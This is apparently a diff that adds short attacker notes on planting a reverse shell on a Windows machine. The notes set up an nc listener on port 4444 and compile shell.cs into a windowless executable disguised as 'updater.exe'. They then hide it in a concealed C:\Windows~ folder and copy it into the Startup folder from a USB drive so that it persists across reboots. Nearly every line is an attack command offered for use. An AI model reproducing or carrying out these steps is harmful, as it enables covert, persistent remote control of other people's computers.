@@ -1,0 +1,14 @@
+the updater exe(shell.cs) file is re run every time the computer is started meaning if there is a listener the shell will be restored every target machine start
+
+nc -lvnp 4444 # to create a listener which when the exe is run on the target will turn into a cmd 
+
+mcs -target:winexe shell.cs -out:updater.exe   #important to turn it into a exe with the target winexe part this avoids a cmd being created
+cp install.vbs /media/ep/6197-1B82/
+
+put updater in the startup folder
+    copy C:\Windows~\updater.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\updater.exe"
+
+create windows~ dir and copy updater from usb E to windows~
+    mkdir C:\Windows~
+    attrib +h C:\Windows~
+    copy E:\updater.exe C:\Windows~\updater.exe
